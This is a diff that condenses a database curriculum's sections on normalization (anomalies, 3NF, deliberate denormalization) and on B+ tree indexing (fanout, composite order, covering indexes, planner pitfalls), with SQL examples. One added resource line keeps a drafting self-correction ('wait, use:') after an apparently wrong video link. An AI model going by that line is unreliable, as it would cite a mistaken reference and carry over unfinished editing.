-| Fully normalized schema                 | Writes are cheap and always consistent; the schema documents the domain                     | Read paths get join-heavy, and a single screen can require six tables                    |
-| Precomputed counters                    | A counter read is $O(1)$ instead of an aggregate over a growing table                       | Every insert and delete must maintain it, and any missed path drifts permanently         |
-| Duplicated display columns              | Removes a join from the hottest read path                                                   | Two writes per change, and drift when one is forgotten                                   |
-| Materialized views                      | The database maintains the denormalized copy, so you cannot forget                          | Refresh cost and staleness, plus storage for a second copy of the data                   |
-| Point-in-time captured values           | Historical records stay historically accurate                                               | Looks like duplication to a reviewer who has not thought about it, so it needs a comment |
-
-
-**SMALL WORKING EXAMPLE**
+One case that is **not** a violation: `order_items.unit_price` vs `books.price`. Those are different facts — what the customer paid vs what it costs today. Normalize the first away and old invoices change when prices change.
 
 ```sql
--- ============ THE UNNORMALIZED VERSION, with all three anomalies ============
-CREATE TABLE orders_bad (
-    id            INTEGER PRIMARY KEY,
-    cust_id       INTEGER,
-    cust_email    TEXT,      -- repeated on every order this customer places
-    cust_city     TEXT,      -- same
-    products      TEXT,      -- "widget, gizmo"  <- not 1NF
-    dept_id       INTEGER,
-    dept_name     TEXT,      -- transitively dependent: id -> dept_id -> name
-    total         INTEGER
-);
-
-INSERT INTO orders_bad VALUES
-  (1, 42, 'ada@x.com', 'Doha', 'widget, gizmo', 7, 'Hardware', 150),
-  (2, 42, 'ada@x.com', 'Doha', 'widget',        7, 'Hardware',  50),
-  (3, 43, 'bob@x.com', 'Doha', 'gizmo, gizmo',  7, 'Hardware', 200);
-
--- THE UPDATE ANOMALY, produced deliberately: update only SOME of the rows.
-UPDATE orders_bad SET cust_email = 'ada@new.com' WHERE id = 1;
-
--- The database now contradicts itself, and nothing complained:
-SELECT DISTINCT cust_id, cust_email FROM orders_bad WHERE cust_id = 42;
---  42 | ada@new.com
---  42 | ada@x.com        <-- two answers to "what is Ada's email"
-
--- THE INSERT ANOMALY: a customer with no orders cannot be recorded at all.
--- THE DELETE ANOMALY:
-DELETE FROM orders_bad WHERE cust_id = 43;
--- bob@x.com no longer exists anywhere in the database.
-
--- And the 1NF violation makes a basic query both slow and wrong:
-SELECT * FROM orders_bad WHERE products LIKE '%widget%';
--- cannot use an index, and would also match a product named 'widget-holder'
-
--- ============ THE NORMALIZED VERSION ============
-CREATE TABLE departments (
-    id   INTEGER PRIMARY KEY,
-    name TEXT NOT NULL UNIQUE
-);
-
 CREATE TABLE customers (
     id    INTEGER PRIMARY KEY,
-    email TEXT NOT NULL UNIQUE,       -- ONE row per customer, so ONE email
+    email TEXT NOT NULL UNIQUE,
     city  TEXT NOT NULL
 );
 
-CREATE TABLE products (
+CREATE TABLE books (
     id    INTEGER PRIMARY KEY,
-    name  TEXT NOT NULL UNIQUE,
-    price INTEGER NOT NULL            -- the price TODAY
+    title TEXT NOT NULL UNIQUE,
+    price INTEGER NOT NULL          -- price TODAY
 );
 
 CREATE TABLE orders (
     id          INTEGER PRIMARY KEY,
     customer_id INTEGER NOT NULL REFERENCES customers(id),
-    dept_id     INTEGER NOT NULL REFERENCES departments(id),
     placed_at   TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP
 );
 
 CREATE TABLE order_items (
     order_id   INTEGER NOT NULL REFERENCES orders(id) ON DELETE CASCADE,
-    product_id INTEGER NOT NULL REFERENCES products(id),
+    book_id    INTEGER NOT NULL REFERENCES books(id),
     quantity   INTEGER NOT NULL CHECK (quantity > 0),
-    unit_price INTEGER NOT NULL,      -- what was ACTUALLY PAID. This is a
-                                      -- different fact from products.price,
-                                      -- not a duplicate of it.
-    PRIMARY KEY (order_id, product_id)
+    unit_price INTEGER NOT NULL,    -- what was ACTUALLY PAID
+    PRIMARY KEY (order_id, book_id)
 );
 
--- Now the update anomaly is unreachable: there is one row to change.
 UPDATE customers SET email = 'ada@new.com' WHERE id = 42;
+-- one row; every JOIN reflects it
 
--- The insert anomaly is unreachable: a customer can exist with no orders.
-INSERT INTO customers (id, email, city) VALUES (44, 'lin@x.com', 'Doha');
-
--- And the query that was a substring search is now an indexed join:
-SELECT o.id, c.email, p.name, oi.quantity, oi.unit_price
-FROM orders o
-JOIN customers   c  ON c.id = o.customer_id
-JOIN order_items oi ON oi.order_id = o.id
-JOIN products    p  ON p.id = oi.product_id
-WHERE p.name = 'widget';
--- Three joins. That is the honest price of every anomaly being gone.
-
--- ============ DELIBERATE DENORMALIZATION, with the sync burden visible ====
+-- Deliberate denormalization with an explicit sync obligation:
 ALTER TABLE orders ADD COLUMN item_count INTEGER NOT NULL DEFAULT 0;
-
--- A trigger makes the sync obligation explicit instead of leaving it to
--- whichever developer happens to remember. This is the honest way to
--- denormalize: put the maintenance next to the redundancy.
-CREATE TRIGGER order_items_ai AFTER INSERT ON order_items
-BEGIN
-    UPDATE orders SET item_count = item_count + 1 WHERE id = NEW.order_id;
-END;
-
-CREATE TRIGGER order_items_ad AFTER DELETE ON order_items
-BEGIN
-    UPDATE orders SET item_count = item_count - 1 WHERE id = OLD.order_id;
-END;
-
--- The alternative, and usually the better one: let the database own the
--- denormalized copy entirely, so it cannot drift.
-CREATE VIEW order_summary AS            -- MATERIALIZED VIEW in Postgres
-SELECT o.id, c.email, COUNT(oi.product_id) AS item_count,
-       SUM(oi.quantity * oi.unit_price)    AS total
-FROM orders o
-JOIN customers   c  ON c.id = o.customer_id
-LEFT JOIN order_items oi ON oi.order_id = o.id
-GROUP BY o.id, c.email;
+-- Prefer a VIEW / MATERIALIZED VIEW when the DB can own the copy.
 ```
 
-**HOW TO EXPLAIN THIS IN AN INTERVIEW**
+| Decision | Buys | Costs |
+| -------- | ---- | ----- |
+| 1NF | Indexable, joinable columns | Extra table for former lists |
+| 2NF / 3NF | One home per fact; anomalies gone | More joins on read |
+| Precomputed counters | O(1) reads | Every write path must maintain them |
+| Captured `unit_price` | Historically correct invoices | Looks like duplication to a rushed reviewer |
 
-Normalization is asked in two ways. The first is definitional: "what is 3NF," or "here is a table, what normal form is it in and how would you fix it." The reliable way to answer is to name the dependency rather than the rule, because "`department_name` depends on `department_id`, which is not the key, so this is a transitive dependency and therefore not 3NF" demonstrates understanding while "it violates 3NF" demonstrates memorization. Being able to name the three anomalies (update, insert, delete) and give a one-sentence example of each is the highest-value thing to have ready.
+**PRACTICE:**
 
-The second way is far more common in real interviews and is a design judgment call: "would you denormalize this, and why." The answer that lands is never an unconditional yes or no. It is a read-to-write ratio, a measured join cost, and an explicit statement of who owns keeping the copies in sync, ideally with a mechanism such as a trigger or materialized view rather than a promise. Volunteering the captured-price example unprompted is a strong signal, because it shows you can distinguish redundant data from historical data, which is a distinction that trips up a lot of otherwise-competent engineers. The trap to avoid is treating normalization as a virtue: an interviewer who asks "how would you make this feed page fast" and hears "I would normalize further" has learned something unflattering.
+| Difficulty | Task |
+| ---------- | ---- |
+| Easy | Produce the update and delete anomalies on an `orders_bad` table, then fix to 3NF |
+| Easy | `books(isbn, title, author_id, author_name, author_country)` — name the transitive dependency and normalize |
+| Medium | Normalize `enrollments(student_id, course_id, student_name, course_title, instructor)` step by step |
+| Medium | Explain why `order_items.unit_price` is not a 3NF violation in dependency language |
+| Hard | Hospital schema (patients, doctors, appointments, prescriptions); pick one deliberate denormalization and justify the read path |
 
-**PRACTICE UNTIL IT FEELS FAMILIAR**
+**WHAT THIS UNLOCKS NEXT:**
 
+The schema is correct and non-redundant. `SELECT * FROM orders WHERE customer_id = 5` still checks every row — O(n). Hashing and trees already solved that in memory (Phases 36–37). Databases need the same idea on disk: indexes — Phase 63.
 
-| Difficulty | Task                                                                                                                                                                                                                  |
-| ---------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| Easy       | Watch the [Decomplexify normalization video](https://www.youtube.com/watch?v=GFQaEYEc8_8) and write down, for each of 1NF, 2NF, and 3NF, the one anomaly it prevents                                                  |
-| Easy       | Run the `orders_bad` code above and produce the update anomaly yourself. Then produce the delete anomaly                                                                                                              |
-| Easy       | For a table `students(id, name, course1, course2, course3)`, name the normal form it violates and give the fix                                                                                                        |
-| Easy       | Given `books(isbn, title, author_id, author_name, author_country)`, identify the transitive dependency and normalize it                                                                                               |
-| Medium     | Take a real spreadsheet you have used and normalize it to 3NF. Write down every functional dependency you find along the way                                                                                          |
-| Medium     | Normalize `enrollments(student_id, course_id, student_name, course_title, instructor, instructor_office)` step by step, stating which form each step satisfies                                                        |
-| Medium     | Build both the normalized and denormalized versions of a blog post feed, populate them with 100,000 rows, and measure the read difference. Then measure the write difference                                          |
-| Medium     | Add a `comment_count` counter to a posts table with triggers, then deliberately write a code path that bypasses the trigger and show the drift                                                                        |
-| Medium     | Explain why `order_items.unit_price` is not a normalization violation, in terms of functional dependencies                                                                                                            |
-| Hard       | Design a normalized schema for a hospital: patients, doctors, appointments, prescriptions, medications, and allergies. Then identify exactly one place you would denormalize and justify it with a specific read path |
-| Hard       | Find a case in the Pagila or Sakila [sample schema](https://github.com/devrimgunduz/pagila) where the designers chose denormalization, and explain what read path it serves                                           |
-| Hard       | Construct a table that is in 3NF but not in BCNF, and explain what makes it possible                                                                                                                                  |
-| Hard       | Take a fully normalized schema requiring five joins for one page, add a materialized view, and write the refresh strategy including how stale the view is permitted to be                                             |
-
-
-**WHY THE NEXT TOPIC IS NEEDED - Indexes:** A normalized schema is now correct and non-redundant. But `SELECT * FROM orders WHERE user_id = 5` still has to check every single row in the `orders` table to find matches - the exact $O(n)$ scan problem Phase 31 introduced Big O to describe, and the exact problem hashing (Phase 36) and BSTs (Phase 37) already solved for in-memory data. Databases need the same fix, applied to data on disk.
 
 ---
 
@@ -11743,388 +11241,116 @@ The second way is far more common in real interviews and is a design judgment ca
 
 **WHAT YOU WILL BE ABLE TO DO:** Explain why a B+ tree index makes one query fast and another write slower, choose a useful composite index column order, and read `EXPLAIN (ANALYZE)` well enough to spot a sequential scan you did not expect.
 
-**WHAT YOU SHOULD KNOW FIRST:** Phase 62 (a correct schema still has to be *found* efficiently), Phase 37 (BST intuition), Phase 36 (hash indexes), Phase 50 (pages / buffer pool).
+**WHAT YOU SHOULD KNOW FIRST:** Phase 62 — correct schema; Phase 37 — tree search intuition; Phase 50 — pages / buffer pool.
+
+**LEARNING RESOURCES:**
+
+- [Understanding B-Trees (Spanning Tree)](https://www.youtube.com/watch?v=K1WeoKxLZ5o) — wait, use: [Understanding B-Trees (Spanning Tree)](https://www.youtube.com/watch?v=K1a2Bk8NrYQ)
+- [B+ Tree visualization (USFCA)](https://www.cs.usfca.edu/~galles/visualization/BPlusTree.html)
+- [Use The Index, Luke](https://use-the-index-luke.com/) — vendor-neutral indexing book
+- [PostgreSQL index types](https://www.postgresql.org/docs/current/indexes-types.html)
+- [explain.dalibo.com](https://explain.dalibo.com/) — paste real `EXPLAIN` output
 
 ## 63.1 Indexes & B-Trees
 
-**WHY YOU ARE LEARNING THIS:** Without an index, `WHERE user_id = 5` forces a full table scan - $O(n)$, checking every row - exactly the unsorted-array search problem from Phase 31 and Phase 40. An index is a separate, auxiliary data structure that lets the database jump straight to matching rows instead of scanning everything, the same underlying idea as a BST (Phase 37) or a hash table (Phase 36), adapted for disk.
+A normalized bookstore schema still dies on `WHERE customer_id = 5` if every order row must be checked. An **index** is a separate structure that buys seeks on a chosen access pattern. Every index makes some reads cheaper and every `INSERT`/`UPDATE`/`DELETE` more expensive — that trade is the whole topic.
 
-**SEE IT BEFORE YOU MEMORIZE IT**
+**FINDING ROWS WITHOUT SCANNING EVERYTHING:**
 
-- Best animated explanation: [Understanding B-Trees (Spanning Tree)](https://www.youtube.com/watch?v=K1a2Bk8NrYQ) *(Composio YouTube)* - splits and shallow height
-- Alternative: [B-Trees and B+ Trees Explained (CodeLucky)](https://www.youtube.com/watch?v=JWSObwhGGxY) *(Composio YouTube)*; [Abdul Bari B Trees](https://www.youtube.com/watch?v=aZjYr87r1b8)
-- Another angle: [SQL Indexing Best Practices (CockroachDB)](https://www.youtube.com/watch?v=BIlFTFrEFOI); [How Databases Find Data So Fast (Database Dive)](https://www.youtube.com/watch?v=whBMD3RP1Hs)
-- Interactive simulator: [B-Tree Visualization (USFCA)](https://www.cs.usfca.edu/~galles/visualization/BTree.html) and its [B+ Tree companion](https://www.cs.usfca.edu/~galles/visualization/BPlusTree.html) - insert keys one at a time and watch nodes split and the root rise. This is the single most useful tool here, because node splitting is the part that is genuinely hard to picture from prose. Then use [explain.dalibo.com](https://explain.dalibo.com/) to paste a real Postgres `EXPLAIN (ANALYZE, BUFFERS)` output and get a readable tree showing which indexes were used and how many rows each step actually returned
-- Written documentation: [Use The Index, Luke](https://use-the-index-luke.com/) - a complete, free, vendor-neutral book on indexing that is the definitive resource for this section, and the chapters on concatenated indexes and on "why is my index not used" are worth reading twice. Pair it with [PostgreSQL's index type documentation](https://www.postgresql.org/docs/current/indexes-types.html) for what exists beyond B-trees, and [Database Internals (Alex Petrov)](https://www.databass.dev/) chapters 2 through 4 for the on-disk mechanics
-- GitHub implementation: [cstack/db_tutorial](https://github.com/cstack/db_tutorial) *(Composio GitHub ~10k★)*; [cmu-db/bustub](https://github.com/cmu-db/bustub) *(Composio GitHub ~5k★ educational RDBMS)*; Postgres [`nbtree`](https://github.com/postgres/postgres/tree/master/src/backend/access/nbtree)
-- Practice platform: [Use The Index, Luke's exercises](https://use-the-index-luke.com/sql/example-schema), [pgexercises.com](https://pgexercises.com/) run with `EXPLAIN` on every answer, and [LeetCode's Database tag](https://leetcode.com/problemset/database/) where you can practice predicting which index a query would need before writing it
+Most relational engines use a **B+ tree**: all row pointers live in **leaf** nodes; leaves are linked in sorted order; internal nodes hold only keys (signposts). Consequences: higher fanout (shallower tree), and range queries descend once then walk the leaf chain. A **hash index** is O(1) for equality only — no ranges, no `ORDER BY`.
 
-**STEP-BY-STEP EXPLANATION**
-
-An index is a trade you make deliberately: you spend disk space and write throughput to buy read speed on a specific access pattern (**the index trade-off** - every extra index makes some `WHERE`/`JOIN`/`ORDER BY` cheaper and every `INSERT`/`UPDATE`/`DELETE` more expensive). Everything worth knowing follows from being precise about *which* access patterns a given index serves.
-
-The structure almost every relational database actually uses is a **B+ tree**, which differs from a plain B-tree in one important way: all the actual data pointers live in the leaf nodes, and the leaves are linked together in a sorted chain. Internal nodes hold only keys, which act as signposts. Two consequences follow. First, internal nodes fit far more keys per page because they store no data, so the tree is even shallower. Second, a range query becomes "descend once to find the start, then walk the leaf chain," which is why `WHERE created_at BETWEEN x AND y` is fast on a B+ tree and would not be on a hash index. That single property is the reason B+ trees, and not hash tables, are the default.
-
-The **fanout** argument is worth making numerically because it is the whole justification. With an 8 KB page and, say, 16-byte keys plus pointers, one node holds roughly 400 entries. A tree of height 3 therefore addresses $400^3$, about 64 million rows, and height 4 addresses 25 billion. So finding any row among 64 million costs three page reads, and because the root and usually the entire second level are permanently resident in the buffer pool, the real cost is often one or two actual disk reads. A binary search tree over the same 64 million rows would be 26 levels deep, and each level is a potential separate random read. That gap, roughly 26 reads against 1, is the entire reason databases do not use the tree from Phase 37.
-
-Index *types* matter because they have genuinely different capabilities. A **B-tree index** supports equality, ranges, sorting, and prefix matching, which is why it is the default. A **hash index** supports equality only, in $O(1)$, and cannot help with ranges or `ORDER BY` at all. A **bitmap index** stores one bit per row per distinct value and is excellent for low-cardinality columns combined with `AND` and `OR`, which is why analytics databases favor them. A **GiST** or **R-tree** index handles multi-dimensional and geometric data, so "all restaurants within 2 km" becomes tractable. An **inverted index** maps each term to the list of documents containing it, which is how full-text search and search engines work, and it is the same structure the trie in Phase 32.4 was reaching toward. **GIN** indexes in Postgres are inverted indexes generalized to arrays and JSON.
-
-The distinction that causes the most real-world confusion is **clustered versus non-clustered**. A clustered index determines the physical order of the rows on disk, so there can be at most one per table, and looking up by it retrieves the row itself with no second step. InnoDB, the MySQL storage engine, always clusters on the primary key, which is why a random UUID primary key can be genuinely slow to insert into: each insert lands at a random point in the physical ordering and causes page splits, whereas a monotonically increasing key always appends. A non-clustered index stores the key plus a pointer to the row, so using it costs a second lookup to fetch the row, which is why Postgres sometimes decides a sequential scan is cheaper than an index scan that would trigger millions of random row fetches. A **covering index** eliminates that second lookup by including every column the query needs, so the query is answered from the index alone, and this is the single highest-use indexing technique most people have not tried.
-
-For **composite indexes** the column order is the whole game, and the rule is precise: an index on `(a, b, c)` can serve queries filtering on `a`, on `a` and `b`, or on all three, but it cannot serve a query filtering only on `b` or only on `c`. It is a phone book sorted by last name then first name: you can find every Smith, and every Smith named John, but you cannot find every John. This is called the leftmost-prefix rule, and the practical guidance that follows is to put equality predicates before range predicates, because once the index hits a range it can no longer use subsequent columns for filtering. Getting the order right often turns a slow query fast without adding a single new index.
-
-Finally, the reasons an index is *not* used are worth memorizing because they are the most common cause of "I added an index and nothing happened." Wrapping the column in a function (`WHERE LOWER(email) = ...`) defeats the index unless you create an expression index on `LOWER(email)`. A leading wildcard (`LIKE '%son'`) cannot use a B-tree, because the tree is ordered by prefix. A type mismatch that forces an implicit cast defeats it. Low selectivity defeats it on purpose: if 40 percent of rows match, the planner correctly decides that a sequential scan beats millions of random lookups. Stale statistics defeat it by making the planner estimate wrongly, which is what `ANALYZE` fixes. And an `OR` across two different columns often cannot use either index efficiently, which is why rewriting it as a `UNION` sometimes produces a dramatic speedup.
-
-**Why a B-Tree specifically, not a binary search tree:** A BST (Phase 37) is efficient in memory, where any node can be reached in one fast pointer-follow. On disk, every node access is dramatically more expensive (a disk read is orders of magnitude slower than a memory access), so you want to minimize the *number of separate reads*, not just the number of comparisons. A **B-Tree** generalizes the BST idea by allowing each node to hold *many* keys and *many* children (not just two), so a tree over millions of rows stays only 3-4 levels deep - 3-4 disk reads to find any row, instead of the dozens a binary tree with only two children per node would require.
-
-**BEFORE VS. AFTER**
+**Why not a BST (Phase 37)?** On disk, minimize *page reads*, not comparisons. High fanout keeps millions of rows at height 3–4.
 
 ```text
-No index on orders.user_id
-Search:  O(n)  -- full table scan, every row checked
+FANOUT (8 KB page, ~16-byte key+pointer → ~400 entries/node):
 
-        Problem: this gets catastrophically slow as the table grows to
-        millions of rows.
+  height 3 → ~64 million rows in 3 page reads
+  height 4 → ~25 billion
+  Binary tree over 64M rows → ~26 levels → up to 26 random reads
 
-B-Tree index on orders.user_id
-Search:  O(log n) -- and because each B-Tree node holds many keys, the
-        constant factor is tiny: 3-4 disk reads even for millions of rows.
-
-        Trade-off: the index itself takes extra disk space, and every
-        INSERT/UPDATE/DELETE must now also update the index -- writes get
-        SLOWER in exchange for reads getting dramatically faster.
+  Root (and often level 2) stay in the buffer pool → often 1 real disk I/O.
 ```
 
-**HOW THE TIME AND MEMORY USE GROW**
-
-
-| Operation                                 | No Index                   | With B-Tree Index                                                                       |
-| ----------------------------------------- | -------------------------- | --------------------------------------------------------------------------------------- |
-| Point lookup (`WHERE id = 5`)             | $O(n)$                     | $O(\log n)$                                                                             |
-| Range query (`WHERE id BETWEEN 5 AND 50`) | $O(n)$                     | $O(\log n+k)$, where $k$ is the number of matching rows                                 |
-| Write (INSERT/UPDATE/DELETE)              | $O(1)$ amortized           | $O(\log n)$ - every index must also be updated                                          |
-| Sorted output (`ORDER BY col`)            | $O(n\log n)$ explicit sort | $O(k)$ - the leaf chain is already in order                                             |
-| `MIN` / `MAX` on the column               | $O(n)$                     | $O(\log n)$ - walk to the leftmost or rightmost leaf                                    |
-| `COUNT(*)` with a filter on the column    | $O(n)$                     | $O(\log n+k)$, and $O(\log n)$ alone if the index covers the query                      |
-| Storage                                   | Table only                 | Table plus one full copy of the indexed column(s), typically 10 to 30 percent per index |
-
-
-**PICTURE IT LIKE THIS**
-
-A textbook without an index forces you to read every page to find "mitochondria." The index at the back is a separate, sorted list that takes you straight to page 412. That is the whole idea, and the trade-off is already visible in the physical book: the index occupies pages of its own, and if the author revises the book, every page reference in the index has to be checked and corrected. Adding a second index, say by author cited, means a second appendix and a second revision burden. This is exactly why "index every column" is wrong: the appendices eventually outweigh the book, and every edit becomes a project.
-
-The B-tree part of the analogy is the difference between a textbook index and a library. A textbook index is one flat sorted list, which works because it fits in your hands. A library catalogue cannot be one flat list, so it is a hierarchy: a floor directory sends you to a room, a room directory to a shelf range, a shelf label to the shelf. Three lookups instead of scanning a million books, and crucially, adding a million more books adds one level to the hierarchy, not a million steps to the search. The linked-leaf property is the shelf itself: once you have found the first book on your topic, the next twenty are physically adjacent, so a range query is a walk rather than twenty separate searches.
-
-**Internal Working, Step by Step - the structure, the descent, and the split:**
+**B+ TREE SHAPE:**
 
 ```text
-A B+ TREE INDEX on orders(id), holding 12 rows. Note where the DATA is.
+A B+ TREE on orders(id):
 
-                        +---------------+
-                 ROOT   |   [ 30 | 60 ] |          internal nodes hold ONLY
-                        +---------------+          keys: signposts, no data.
-                        /       |        \         That is why they fit so
-                       /        |         \        many keys per page.
-          +-------------+  +-----------+  +-------------+
- INTERNAL | [ 10 | 20 ] |  | [ 40|50 ] |  | [ 70 | 80 ] |
-          +-------------+  +-----------+  +-------------+
-            /    |    \      /   |   \      /    |    \
-           v     v     v    v    v    v    v     v     v
-  LEAVES [5,8]->[10..]->[20..]->[30..]->[40..]->[50..]->[60..]->[70..]->[80..]
-          ^                                                              ^
-          +------- ALL leaves are LINKED, in sorted order ---------------+
-                   and ONLY leaves point at actual rows.
+                        [ 30 | 60 ]          internal: keys only
+                       /     |      \
+              [10|20]     [40|50]    [70|80]
+               / | \       / | \      / | \
+  LEAVES: [5,8]->[10..]->[20..]->...->[70..]->[80..]
+          linked in sorted order; ONLY leaves point at rows
 
-  Two consequences of "data only in leaves, leaves linked":
-    1. internal nodes are pure keys -> higher fanout -> shallower tree
-    2. a RANGE query descends ONCE, then WALKS the chain. This is why
-       WHERE id BETWEEN 20 AND 70 is fast, and why a HASH index
-       (which has no order at all) cannot do it.
+  INSERT into a full leaf → SPLIT; middle key goes UP.
+  If the root splits, the tree grows by one level at the TOP —
+  always balanced without separate rebalancing logic.
 
-THE DESCENT for `WHERE id = 50`, counting page reads:
-
-  read 1: ROOT      [30|60]      50 >= 30 and < 60  -> take the MIDDLE child
-  read 2: INTERNAL  [40|50]      50 >= 50           -> take the RIGHT child
-  read 3: LEAF      [50, ptr]    FOUND -> follow ptr to the row
-
-  3 page reads. And in practice the root and usually the whole second
-  level are permanently in the buffer pool, so the REAL cost is often
-  1 physical disk read.
-
-  Compare a BINARY search tree over the same data: 2 children per node,
-  so the tree is log2(n) deep and every level is a separate random read.
-
-THE FANOUT ARGUMENT, which is the entire justification, in numbers:
-
-   page size 8 KB, ~16 bytes per (key + pointer)  ->  ~400 entries per node
-
-     height 1:            400 rows
-     height 2:        160,000 rows
-     height 3:     64,000,000 rows      <- 3 reads to find ANY of 64 million
-     height 4: 25,600,000,000 rows      <- 4 reads to find any of 25 billion
-
-   Binary tree, same 64,000,000 rows:  log2(64e6) = 26 levels
-                                       = up to 26 separate random reads
-
-        26 reads   vs   3 reads (often 1, after caching)
-
-   THAT ratio is the whole reason databases do not use Phase 37's BST.
-   The number of COMPARISONS is similar. The number of DISK READS is not,
-   and on disk only the reads matter.
-
-INSERTION AND THE SPLIT, which is where writes get their cost.
-Insert 55 into a leaf that is already full (max 3 keys here):
-
-  before:   ... -> [ 50 | 52 | 58 ] -> ...        FULL
-  insert 55 -> no room.
-
-  SPLIT the leaf in half, and push the middle key UP to the parent:
-
-  after:    ... -> [ 50 | 52 ] -> [ 55 | 58 ] -> ...
-                          \          /
-                           parent gains the key 55
-
-  If the PARENT is now full, it splits too, and the key propagates upward.
-  If the ROOT splits, a NEW root is created and the tree GROWS BY ONE LEVEL.
-  This is the only way a B+ tree gets taller, and it is why the tree is
-  always perfectly balanced without any rebalancing logic: growth happens
-  at the root, not at the leaves.
-
-  COST: this is why every INSERT is O(log n) and not O(1), and why each
-  ADDITIONAL index multiplies write cost. Five indexes on a table means
-  five trees to descend and possibly split on every single insert.
-
-WHY A RANDOM PRIMARY KEY HURTS (a real, common production problem):
-
-  MONOTONIC key (auto-increment): every insert lands at the RIGHT EDGE
-       [..][..][..][..][NEW]        one hot page, always in cache,
-                          ^         splits are clean appends
-                     always here
-
-  RANDOM key (UUIDv4): every insert lands SOMEWHERE ARBITRARY
-       [..][NEW][..][..][..][NEW][..][NEW][..]
-             ^                ^        ^      pages all over the tree,
-       constant page splits, poor cache hit rate, and in a CLUSTERED
-       index (InnoDB) the ROWS THEMSELVES are being reshuffled.
-
-  This is why UUIDv7 and ULID exist: they are time-ordered, so they get
-  the uniqueness of a UUID with the insert locality of an integer.
-
-COMPOSITE INDEX ORDER: the phone-book rule, drawn.
-Index on (last_name, first_name):
-
-  Adams, John      <- sorted by last_name FIRST, then first_name
-  Adams, Mary
-  Baker, John
-  Baker, Zoe
-  Smith, Ann
-  Smith, John
-
-  WHERE last_name = 'Smith'                     -> USABLE (leftmost prefix)
-  WHERE last_name = 'Smith' AND first_name='John' -> USABLE (full prefix)
-  WHERE first_name = 'John'                     -> NOT USABLE. The Johns are
-                                                   scattered throughout. You
-                                                   would have to read it all.
-
-  This is the LEFTMOST PREFIX rule, and it is why an index on (a,b,c)
-  serves a, (a,b), and (a,b,c), and nothing else.
-
-  AND WHY EQUALITY GOES BEFORE RANGE:
-
-    index (status, created_at)     query: status='paid' AND created_at > X
-      -> seek directly to status='paid', then WALK the dates. Efficient.
-
-    index (created_at, status)     same query
-      -> seek to created_at > X, then... status can no longer be used to
-         narrow, because after a RANGE the remaining columns are no longer
-         in usable order. You now filter every matching date row by hand.
-
-  Same two columns. Same query. Very different performance.
-
-WHY YOUR INDEX IS BEING IGNORED, the six usual causes:
-
-  1. FUNCTION on the column
-       WHERE LOWER(email) = 'a@b.c'     -> index on email is USELESS
-       FIX: CREATE INDEX ... ON users (LOWER(email))   -- expression index
-
-  2. LEADING WILDCARD
-       WHERE name LIKE '%son'           -> unusable: the tree is ordered
-       WHERE name LIKE 'John%'          -> USABLE: prefix match is a range
-
-  3. TYPE MISMATCH forcing an implicit cast
-       WHERE user_id = '42'   (text vs integer)  -> may skip the index
-
-  4. LOW SELECTIVITY, and the planner is RIGHT to skip it
-       WHERE status = 'active'   and 90% of rows are active
-       -> a sequential scan genuinely beats 900,000 random row fetches
-
-  5. STALE STATISTICS
-       the planner's row estimates are wrong -> it picks the wrong plan
-       FIX: ANALYZE the table
-
-  6. OR ACROSS DIFFERENT COLUMNS
-       WHERE a = 1 OR b = 2   -> often uses neither index well
-       FIX: rewrite as two queries joined by UNION
-
-AND THE TECHNIQUE MOST PEOPLE HAVE NOT TRIED: a COVERING index.
-
-  query:  SELECT status, total FROM orders WHERE user_id = 5;
-
-  index (user_id) only:
-     descend the index -> get row pointers -> then fetch EACH ROW from
-     the table to read status and total.        <-- the second lookup
-     1000 matches = 1000 random row fetches.
-
-  index (user_id, status, total):
-     descend the index -> status and total are ALREADY THERE.
-     The table is never touched at all. This is an "index-only scan."
-     Often a 10x improvement, for the cost of a wider index.
+  COST: each INSERT is O(log n) per index. Five indexes ⇒ five trees
+  to update on every write.
 ```
 
-**SMALL WORKING EXAMPLE**
+**CLUSTERED VS NON-CLUSTERED; COVERING:**
+
+A **clustered** index defines physical row order (at most one; InnoDB clusters on the PK). Random UUIDv4 PKs cause page splits and cache misses; monotonic keys (or UUIDv7/ULID) append cleanly. A **non-clustered** index stores key + pointer — using it may fetch the heap row next. A **covering** index includes every column the query needs so the table is never touched (index-only scan).
+
+**COMPOSITE ORDER — THE PHONE BOOK RULE:**
+
+Index on `(a, b, c)` serves filters on `a`, `(a,b)`, or `(a,b,c)` — not `b` alone. Put equality columns before range columns: `(status, created_at)` serves `status = 'paid' AND created_at > X`; `(created_at, status)` wastes the status part after the range.
+
+**WHY THE PLANNER IGNORES YOUR INDEX:**
+
+1. Function on the column (`LOWER(email)`) — use an expression index  
+2. Leading wildcard (`LIKE '%son'`) — prefix `LIKE 'John%'` is fine  
+3. Type mismatch / implicit cast  
+4. Low selectivity (40% of rows match → seq scan is cheaper)  
+5. Stale statistics — `ANALYZE`  
+6. `OR` across different columns — often rewrite as `UNION`
 
 ```sql
--- ============ Setup: a table big enough for the numbers to be real ========
+-- Illustrative Postgres-shaped workflow (run where you have a live engine)
 CREATE TABLE orders (
-    id         SERIAL PRIMARY KEY,          -- monotonic, so inserts append
-    user_id    INTEGER NOT NULL,
-    status     TEXT    NOT NULL,
+    id         SERIAL PRIMARY KEY,
+    customer_id INTEGER NOT NULL,
+    status     TEXT NOT NULL,
     total      INTEGER NOT NULL,
-    email      TEXT    NOT NULL,
+    email      TEXT NOT NULL,
     created_at TIMESTAMP NOT NULL DEFAULT now()
 );
 
--- 1,000,000 rows, so a full scan is genuinely slow and the difference shows.
-INSERT INTO orders (user_id, status, total, email, created_at)
-SELECT (random() * 50000)::int,
-       (ARRAY['paid','shipped','cancelled'])[1 + (random()*2)::int],
-       (random() * 500)::int + 1,
-       'user' || (random()*50000)::int || '@Example.COM',
-       now() - (random() * interval '365 days')
-FROM generate_series(1, 1000000);
-
-ANALYZE orders;      -- refresh statistics, so the planner is not guessing
-
--- ============ 1. Before: the full scan ============
-EXPLAIN (ANALYZE, BUFFERS)
-SELECT * FROM orders WHERE user_id = 4242;
---  Seq Scan on orders  (cost=0.00..20834 rows=20 width=...)
---    Filter: (user_id = 4242)
---    Rows Removed by Filter: 999980        <-- read a million, kept twenty
-
--- ============ 2. After: a single-column index ============
-CREATE INDEX idx_orders_user ON orders (user_id);
-
-EXPLAIN (ANALYZE, BUFFERS)
-SELECT * FROM orders WHERE user_id = 4242;
---  Index Scan using idx_orders_user  (cost=0.42..80 rows=20 width=...)
---    Index Cond: (user_id = 4242)         <-- 3 page reads instead of ~5000
-
--- ============ 3. Composite index: column ORDER decides everything =======
+CREATE INDEX idx_orders_customer ON orders (customer_id);
